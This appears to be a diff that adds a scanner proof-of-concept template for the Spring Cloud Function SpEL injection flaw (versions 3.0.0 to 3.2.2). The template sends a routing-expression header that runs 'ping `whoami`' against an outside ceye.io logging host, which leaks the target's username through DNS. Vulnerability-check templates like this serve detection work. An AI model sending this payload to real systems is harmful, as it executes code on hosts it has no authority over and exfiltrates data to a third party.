@@ -1,0 +1,18 @@
+name: springcloud-function-spel-rce
+set:
+  rand: randomInt(200000000, 210000000)
+  payload: urldecode("ping `whoami`.wlma0t.ceye.io")
+rules:
+  - method: POST
+    path: "/functionRouter"
+    headers:
+      spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("{{payload}}")
+    expression: |
+      response.status == 500
+detail:
+  author: sulab
+  version: 3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2
+  links:
+    - https://www.cnblogs.com/wh4am1/p/16062306.html
+  description: 由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。
+  product: Spring Cloud Function
